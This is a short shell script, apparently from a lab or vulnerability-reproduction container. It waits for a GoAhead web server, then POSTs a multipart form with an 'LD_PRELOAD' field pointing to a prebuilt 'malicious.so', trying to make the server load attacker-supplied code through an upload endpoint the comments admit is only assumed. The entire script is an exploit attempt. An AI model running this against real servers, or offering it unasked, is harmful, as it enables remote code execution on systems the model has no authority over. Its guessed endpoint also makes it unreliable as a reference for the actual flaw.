#!/bin/sh
# Wait for the GoAhead service to become reachable
while ! curl -s http://goahead:80/ >/dev/null 2>&1; do
  echo "Waiting for GoAhead service..."
  sleep 2
done

# Create a dummy malicious shared object (already compiled inside the image)
# Perform the exploit: upload a file with the field name LD_PRELOAD to inject the shared object
# GoAhead's vulnerable upload endpoint is assumed to be /upload (adjust if different)
curl -s -X POST "http://goahead:80/upload" \
  -F "LD_PRELOAD=@/usr/local/bin/malicious.so;type=application/octet-stream" \
  -F "file=@/usr/local/bin/malicious.so" \
  -o /dev/null

echo "Exploit attempt finished. If the target is vulnerable, the shared object would be loaded."